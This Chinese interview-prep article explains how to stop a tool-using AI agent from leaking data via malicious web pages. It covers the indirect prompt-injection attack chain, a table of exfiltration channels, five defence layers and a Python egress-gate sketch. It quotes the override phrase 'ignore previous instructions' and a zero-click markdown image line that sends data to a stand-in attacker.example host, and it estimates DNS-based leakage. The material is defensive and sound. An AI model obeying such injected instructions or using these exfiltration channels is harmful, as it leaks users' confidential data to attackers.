---
type: question
id: safety-06
topic: 安全、安保与负责任 AI
order: 6
question: 你如何防止具备工具调用权限的 agent 通过恶意网页外泄数据？
question_en: How do you prevent a tool-enabled agent from exfiltrating data through malicious web pages?
asked_at: [OpenAI]
level: 高阶
tags: [数据外泄, agent-安全, capability, 出站审查]
sources:
  - title: Prompt Injection in LLMs
    url: https://outcomeschool.com/blog/prompt-injection-in-llms
    author: Amit Shekhar (Outcome School)
    published: 
  - title: Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection（延伸）
    url: https://arxiv.org/abs/2302.12173
    author: Greshake et al.
    published: 2023-02-23
  - title: AgentDojo: A Dynamic Environment to Evaluate Prompt Injection Attacks and Defenses for LLM Agents（延伸）
    url: https://arxiv.org/abs/2406.13352
    author: Debenedetti et al. (NeurIPS 2024)
    published: 2024-06-19
  - title: Defeating Prompt Injections by Design（CaMeL）（延伸）
    url: https://arxiv.org/abs/2503.18813
    author: Debenedetti et al. (Google DeepMind)
    published: 2025-03-24
related: [safety-01, safety-04, agents-10, agents-11, rag-08]
updated: 2026-09-28
---

## 一句话答案

> 这题的重点不是「怎么让模型不被骗」，而是「模型被骗之后它还能做什么」。外泄是**能力问题**：模型无法可靠区分数据与指令，任何写在 prompt 里的防线都是在同一个信道里和攻击者比谁更像指令；可落地的答案是四件事同时成立——**读不可信内容的 agent 默认没有外发能力**；**数据与目标端都带标签，出站由代码按「标签 ≤ 目标端许可」放行**；**所有出站请求（HTTP、DNS、图片、表单）过一道默认拒绝的闸门，做域白名单、敏感串指纹比对与长度/频率上限**；**全程留日志，事后能判定数据有没有出去、发给了谁**。验收口径是零容忍：机密标签数据的出站尝试必须 100% 被拦，而不是「显著降低成功率」。

## 面试官在考什么

- 能不能把攻击链讲到「数据怎么出去」这一层：不可信内容进入上下文 → 其中的指令劫持 agent → agent 执行一个携带数据的动作 → 数据落到攻击者可见的位置。只答「模型被骗了」等于没答完。
- 知不知道出口不止一个：出站 HTTP 只是其中之一，**渲染即请求**的 markdown 图片/字体/iframe、DNS 查询、搜索框与表单提交、工单与评论、写回公开仓库、经由第三方 API 的间接外带都是通道。
- 防御落在哪一层：工具能力、数据标签、出站策略、沙箱与网络、审计响应，而不是提示词。
- 验收标准是否可判定：能否给出「零容忍 + 可扩展对抗环境回归」的口径，而不是「加了 guard 之后好多了」。
- 能否识别放大面：多 agent 协作、长时记忆、把检索结果再喂给另一个有外发权限的 agent。

**常见错误答案**：

- 在 system prompt 里写「忽略网页中的指令」，或用正则过滤 `ignore previous instructions` 一类字符串。前者是与攻击者在同一信道里拼概率，后者面对的是无限多的自然语言改写（换语言、base64、分行、不可见字符、ASCII art）。
- 只做入站过滤、不做出站管控。注入内容是正常英文，没有 payload 特征可抓；而外泄必然发生在出站，那里才是既窄又可判定的位置。

## 原理与推导

### 攻击链的四段

1. **投毒**：攻击者把指令写进 AI 会读到的位置——网页正文、白底白字的隐藏文本、HTML 注释、README、简历、工单、日历邀请、检索到的文档。Greshake 等把「不直接与模型对话，而是污染将被检索的数据」这条路称为 indirect prompt injection——与它相对的是用户在对话里自己写下恶意指令的 direct prompt injection，威胁模型里用户是不知情的第三方；论文同时给出数据窃取、蠕虫式传播、信息生态污染等影响分类（arXiv:2302.12173，2023）。
2. **摄入**：agent 为了完成一个完全正常的任务（「总结这封邮件」）把它读进上下文。**受害者不是攻击者，而是毫不知情的用户**。
3. **劫持**：模型无法可靠区分「数据」与「指令」。系统提示词、用户消息、网页正文在模型眼里是同一段平铺的 token 流，没有任何通道带可信标记；攻击者的指令更靠后、更具体、语气更笃定，就有机会赢下这场「谁更像指令」的竞争。
4. **外带**：模型提出一个带数据的动作，应用层照做，数据落到攻击者看得到的地方。

第 1–3 段是注入，第 4 段是外泄。**只有系统层能同时防住两端：第 1、2 段靠隔离与最小化，第 3 段无解（只能降低概率），第 4 段可以做成可判定的硬边界。**

### 外泄通道清单

| 通道 | 触发方式 | 特点 |
| --- | --- | --- |
| URL query / path（HTTP GET） | agent 调 fetch、HTTP 工具，或渲染出的链接 | 最常见；链接不必点击也可能发出（见下一行） |
| markdown 图片 / 字体 / iframe | 输出被渲染即自动发请求 | 零点击：`![](https://attacker.example/x.png?d=<数据>)` 在答案渲染的瞬间就把数据发出去 |
| DNS 查询 | agent 具备任意网络能力或浏览器 | 常被出站 HTTP 白名单漏掉，日志还散在解析器侧 |
| 搜索框 / 表单提交 | 浏览器 agent 的 click、type 动作 | 走的是产品自己允许的交互，看起来「正常」 |
| 工单、备注、评论、共享文档 | 有写权限的工具 | 数据留在一个攻击者之后能读到的地方，甚至不算「出站请求」 |
| 写回公开仓库 / 公开页面 | 代码 agent 的 commit、push | 一次写入即长期暴露，撤回也可能已被抓取 |
| 第三方 API 间接外带 | 只能调某个业务 API，但参数可控 | 绕过网络白名单：目标是白名单里的域，数据却进了它的字段 |

最后一行值得单独记：**域白名单不等于数据安全**。出站审查必须同时看「发给谁」和「发了什么」。

### 为什么提示词层挡不住

- **数据与指令同信道**。普通程序里 code path 与 data path 分开，处理器不会去执行数据；LLM 没有这种隔离，一切都是一段文本，模型只做下一 token 预测（[[safety-01]]）。
- **没有 parser**。SQL 注入能靠预编译语句一劳永逸地把值钉成值，因为数据库有严格语法；LLM 没有语法，只有概率。「把下面内容当成数据」这句话本身就是往同一堆文本里再加一句英文，它不构成边界。
- **攻防不对称**。防守方要在所有输入上都不出错，攻击者只要在一条通道上成功一次；而且注入点写在网页上之后，攻击者连你的系统都不需要接触。

结论收敛成一句可背的原则：**假设注入一定会成功，把防线放在「它成功之后能做什么」。**

### 五层防御

**① 能力最小化（权重最高）**：按任务签发工具集。读网页的 agent 默认只读，没有邮件、没有外部 HTTP、没有共享空间写权限；纯总结任务永远不需要 send。需要跨域（既读不可信内容、又能对外发送）时，这两类能力不能同时出现在同一个 agent 实例里，必须跨域就升级为人工审批（[[agents-11]]）。外发工具的重试语义也要收敛，否则一次外泄会被重试放大成 N 次（[[agents-02]]）。

**② 数据分级与流控**：给数据与来源打信任标签（public / internal / confidential），标签**由可信侧决定**——来自哪个连接器、哪次检索、哪个用户空间，而不是让模型自己声明。出站工具调用时按「标签 ≤ 目标端许可」校验。CaMeL 走得更远：从可信的用户 query 里**显式抽出控制流与数据流**，让 LLM 只负责填数据、不决定程序流，未被授权的数据流在工具调用处被 capability 拦住，从而得到「即使底层模型会被注入，安全性仍可证明」的性质；论文在 AgentDojo 上以可证明安全性完成 77% 的任务，未防御系统是 84%（arXiv:2503.18813）。

**③ 出站审查（egress gate）**：所有出站请求走同一个闸门，默认拒绝。检查项包括目标域白名单（DNS 与图片/字体域一并覆盖）、参数里是否出现上下文中敏感串的指纹、单参数长度与出站频率上限、禁止把整段上下文塞进参数。指纹要在规范化之后再比：percent-encoding、base64/hex、大小写与空白都要展开，否则换一种编码就绕过去了。

**④ 沙箱与网络策略**：浏览器与代码执行环境默认无出网；确需出网时走代理，在代理里执行第 ③ 层的策略并注入凭据。凭据不进上下文、不进模型可控参数（[[safety-07]]），否则注入可以顺手把 token 一起带走。浏览环境与用户会话隔离（单独身份 + 目标域白名单），避免 agent 继承登录态的全量权限。

**⑤ 审计与响应**：工具调用、出站请求、渲染出的外部资源三类日志都要留（[[agents-10]]）。审计目标不是「有日志」，而是事后能回答三个问题：这个数据有没有出去、发给了谁、还有多少同类请求。有这三条才能判定外泄、吊销凭据、轮换密钥、通知用户。

把 ② ③ 合成一条判定：设片段 $v$ 的标签为 $\ell(v)$，出站目标（域或工具）的许可为 $c(s)$，则 $v$ 被允许流向 $s$ 当且仅当 $\ell(v) \preceq c(s)$，安全目标是

$$\forall v, s:\ \ell(v) \not\preceq c(s)\ \Rightarrow\ \text{block}(v \to s)$$

这里的 $\preceq$ 是按本题需要简化出来的偏序写法，用来把「谁能流向谁」讲成一句可判定的策略，不是 CaMeL 论文本身的形式化；但它抓住了同一个要点：**这个判定里没有模型的位置，策略必须是代码，模型只能提出请求。**

## 数值与代码验证

### 论文口径（照摘要口径引用，不自行换算）

| 数字 | 口径 | 来源 |
| --- | --- | --- |
| 77% 与 84% | CaMeL 在 AgentDojo 上以**可证明安全性**完成任务的占比 77%，未防御系统为 84% | CaMeL 摘要（arXiv:2503.18813） |
| 97 与 629 | AgentDojo 收录 97 个真实任务（邮件客户端、网银、旅行预订等）与 629 个安全用例 | AgentDojo 摘要（arXiv:2406.13352） |
| 两条负面结论 | ① SOTA 模型即使没有攻击也会在一部分任务上失败；② 现有 prompt injection 攻击能破坏部分安全属性，但不是全部 | AgentDojo 摘要 |
| Top 10 第 1 位 | OWASP 的 LLM 应用 Top 10 把 prompt injection 列在第一位 | 参考源一 |

读这两个数字要注意口径：77% 与 84% 不是同一保证下的 A/B——前者带可证明安全性质，后者没有任何安全性保证，不能读成「防御让效果掉了 7 个百分点」。AgentDojo 的定位也要记准：它是**可扩展的对抗环境**（能继续加任务、防御与自适应攻击），不是一份静态测试清单。参考源一给出的是攻击机制、防御清单与 OWASP 排名判断，没有可引用的统计数字，所以上表不引用它的比例。

### 单次请求能带走多少数据（自行推算）

攻击者一定会编码，先给 base64 换算：$n$ 字节编码后是 $4\lceil n/3 \rceil$ 个字符，1500 字节 → 2000 字符；反过来 2000 字符 → 1500 字节。

| 通道 | 单次可携带量（推算） | 依据 |
| --- | --- | --- |
| HTTP URL（query 或 path） | 千字节量级：1500 字节的数据 base64 后约 2000 字符 | 各服务端与中间件对 URL/请求行的限制差异很大，这里只按容量量级估算、不是协议上限；下面示例闸门的阈值另取更保守的 512 字符 |
| markdown 图片 / 字体 / iframe | 与上一行同量级，且是零点击 | 渲染即发请求，一次渲染可放多个元素 |
| DNS | 完整域名上限 253 字符、单 label 上限 63 字符；扣掉基域 `attacker.example`（16 字符）与一个分隔点后，数据预算 236 字符 ≈ 177 字节，单个 label 约 45 字节（63 字符按无填充 base64 最多解出 47 字节） | DNS 名字长度上限 + 上面的 base64 换算 |
| 工单 / 评论 / 公开仓库 | 基本不受限，只受工具权限限制 | 它不是「请求」而是写入，因此必须靠第 ① 层能力收敛挡住 |

按这个表读出的工程结论：**只封 HTTP 出站是不够的**，DNS 与「写入类工具」是两个容易漏的口子；而单次容量有限也意味着攻击者会用高频小包，所以频率与总量阈值和域白名单一样重要。

### 出站闸门的可运行骨架

```python
"""出站闸门（egress gate）：默认拒绝 + 密级标签 + 指纹比对 + 长度上限。"""

import re
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs

LABEL_RANK = {"public": 0, "internal": 1, "confidential": 2}
SHINGLE = 16          # 指纹窗口长度：越小越灵敏，也越容易误报
MAX_QUERY_CHARS = 512
MAX_PARAM_CHARS = 256

# 目标域 -> 允许接收的最高密级；不在表里 = 默认拒绝
EGRESS_POLICY = {
    "api.internal.corp": "confidential",
    "search.partner.com": "public",
}

@dataclass
class Context:
    secrets: set = field(default_factory=set)   # 上下文里机密片段的 n-gram 指纹

def fingerprint(text, k=SHINGLE):
    """把机密文本切成定长滑窗指纹，闸门只持有指纹、不持有原文。"""
    flat = re.sub(r"\s+", " ", text).strip()
    return {flat[i:i + k] for i in range(max(0, len(flat) - k + 1))}

def check(request_url, body, ctx, session_label):
    host = (urlparse(request_url).hostname or "").lower()
    if host not in EGRESS_POLICY:
        return False, "domain-not-allowed"
    if LABEL_RANK[session_label] > LABEL_RANK[EGRESS_POLICY[host]]:
        return False, "label-exceeds-destination"
    payload = request_url + " " + (body or "")
    if any(sec in payload for sec in ctx.secrets):
        return False, "secret-fingerprint-hit"
    query = urlparse(request_url).query
    if len(query) > MAX_QUERY_CHARS:
        return False, "query-too-long"
    if any(len(v[0]) > MAX_PARAM_CHARS for v in parse_qs(query).values()):
        return False, "param-too-long"
    return True, "allow"
```

本机复跑这五条用例的结果（Python 3）：

```text
ALLOW | allow                      | 正常检索：公开查询
BLOCK | domain-not-allowed         | 零点击图片外带：机密片段塞进查询串
BLOCK | label-exceeds-destination  | 被允许的域，但会话是机密级
BLOCK | secret-fingerprint-hit     | 被允许的域 + 指纹命中
BLOCK | param-too-long             | 被允许的域 + 整段上下文灌进参数
```

三点必须说明，否则这段代码会被当成「防御完成」：第一，示例只做明文子串比对，生产版本要在多个规范化视图（percent-decoding、base64/hex 解码、大小写与空白归一）上比对指纹；第二，`SHINGLE` 是灵敏度和误报之间的旋钮——窗口越短越容易在正常英文里误命中，越长则越容易漏掉部分片段的外泄（上面第 4 条用例泄露的是 16 字符前缀，正好落在窗口边界上），需要用自己的流量分布校准；第三，示例没有实现第 ③ 层说的频率与总量阈值，单次请求放行不代表整体安全，生产版本要在会话与用户维度上累计计数并设熔断。

## 常见追问

- **追问**：为什么不能只靠「让模型忽略网页里的指令」？
  - 要点：数据与指令同信道，写提示词等于在同一段文本里和攻击者比谁更像指令；模型是概率系统、没有 parser，所以这类防线只能降低成功率，无法作为「机密数据不得外泄」的依据。带随机 id 的隔离标记（把不可信内容包住并声明为数据）确实能压低攻击成功率，属于纵深的一层，不是边界。
- **追问**：如何检测已经发生的外泄？
  - 要点：三件事拼起来——出站日志（域名、参数长度、指纹命中、时间戳）、上下文中敏感串的规范化指纹、事后审计（对某个时间窗内的全部出站请求重放比对，判定「有没有出去、发给了谁、还漏了多少」）。只在入站做检测的日志在这题里没有价值。
- **追问**：多 agent 协作时外泄面更大吗？
  - 要点：更大，而且是质变。让「读不可信内容的 agent 没有外发能力、有外发能力的 agent 不读不可信内容」看起来是隔离，但真正决定安全的是**agent 之间的消息通道**：被注入的 agent 完全可以把「把这段文本发到某处」当成正常子任务交给有外发权限的 agent，隔离就被抵消。跨 agent 消息也要带标签，接收方的出站策略照常校验（[[agents-06]]）。
- **追问**：加了出站白名单会不会把产品做残？
  - 要点：按任务签发能力，而不是按域全局封杀。默认拒绝 + 显式授权：要么是产品设计里固定的少数目标域，要么是用户可见的一次性授权；不要把「某次任务需要」沉淀成「永久全局允许」。
- **追问**：标签能不能让模型自己打？
  - 要点：不能作为强制依据。标签必须由可信侧决定（连接器、检索路由、用户空间、工具返回的元数据），模型输出的标签只能当提示——这和第 3 节「策略判定必须是代码」是同一条原则。
- **追问**：业务确实要把机密数据发给外部第三方（例如同步到外部 CRM）怎么办？
  - 要点：开一个白名单出口，配字段级数据清单、最小化与脱敏、额度与频率限制、全量审计；出口是一条被审批过的配置，不是模型运行时的自由选择。

## 公司变体

**OpenAI**：从公开可见的 agent 安全材料与产品形态看，这题在 OpenAI 的语境里偏**工程与部署流程**，不偏形式化推导。落点通常在第 ①③④⑤ 层——把不可信内容放进受控的浏览/执行环境、收敛工具与网络访问、对高风险且不可逆的动作要求用户确认、对 agent 行为做监控与日志、发版前做红队。也就是说，回答骨架应当是「能力收敛 → 出站闸门 → 沙箱与凭据隔离 → 审计判定」，把标签流控讲成「为什么这样切分能力」的论证。

第 ② 层的形式化部分（CaMeL 式的控制流/数据流抽取与 capability）是这题的加分位：它把答案从工程清单提升到可论证的安全属性。但要守住口径——论文给的是「在 AgentDojo 上以可证明安全性完成 77% 任务的防御」，不是「解决了 prompt injection」。以上只依据公开材料描述侧重，不涉及任何具体面试轮次或流程。

## 相关题目

- [[safety-01]]：prompt injection 的直接与间接形态、分层防御。本题是它的「外泄」分支，第 3 节的攻击链与同信道论证直接复用。
- [[safety-04]]：面向消费者的 guardrails 与输入/输出过滤。本题第 3 节③的出站审查是输出侧的强化版：guardrails 判断「内容像不像机密」，egress gate 判断「标签允不允许 + 目标域是否授权」。
- [[safety-07]]：prompt、日志与训练数据里的 PII。凭据不进上下文、日志脱敏，是本题 ④⑤ 两层的前置条件。
- [[safety-10]]：发布前的红队方案。本题的验收标准（机密数据外泄零容忍）要进红线集，样本来自按自己工具集自建的用例。
- [[agents-02]]：工具调用的错误、超时与重试。外发工具的重试语义直接决定一次外泄会被放大几次。
- [[agents-06]]：多 agent 编排与失效模式。跨 agent 消息通道是隔离策略最容易被抵消的地方。
- [[agents-10]]：让 agent 的操作可逆或至少可审计。本题 ⑤ 的日志与判定标准与它共用同一套审计面。
- [[agents-11]]：重大操作的 human-in-the-loop 审批。跨域能力（既读外部内容又能外发）应当被拆开，或升级为审批。
- [[evaluation-04]]：回归门禁。注入与出站用例要作为门禁的一部分，模型或 prompt 变更后必须重跑。
- [[rag-08]]：权限感知的 retrieval。检索侧把用户无权访问的内容挡在上下文之外，可直接缩小可外泄的集合。

## 参考资料与归属

- [Prompt Injection in LLMs](https://outcomeschool.com/blog/prompt-injection-in-llms)，Amit Shekhar（Outcome School）——系统提示词/用户输入/取回数据同信道的根因分析、间接注入的投毒位置、零点击外带、防御清单，以及「提示词是请求，代码是规则」的提法。
- [Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection](https://arxiv.org/abs/2302.12173)，Greshake 等，2023-02-23（延伸）——indirect prompt injection 的提出与影响分类（数据窃取、蠕虫式传播、信息生态污染）。
- [AgentDojo: A Dynamic Environment to Evaluate Prompt Injection Attacks and Defenses for LLM Agents](https://arxiv.org/abs/2406.13352)，Debenedetti 等（NeurIPS 2024），2024-06-19（延伸）——第 4 节的 97 个任务 / 629 个安全用例、两条负面结论，以及「可扩展对抗环境而非静态清单」的评测口径。
- [Defeating Prompt Injections by Design（CaMeL）](https://arxiv.org/abs/2503.18813)，Debenedetti 等（Google DeepMind），2025-03-24（延伸）——第 3 节 ② 的控制流/数据流抽取与 capability 流控，以及 77% / 84% 的 AgentDojo 数字。

来源覆盖说明：攻击链、通道清单与五层防御的工程落点来自参考源一；「数据与指令同信道」的问题定性与间接注入的影响分类来自 Greshake 等；评测口径与全部论文数字来自 AgentDojo 与 CaMeL 两篇（均为延伸来源）。第 4 节的通道容量换算与出站闸门代码由本篇自行推算并在本机复跑，不来自上述资料。

本文为理解后的中文重述，结论与公式来自上述资料，版权归原作者所有。
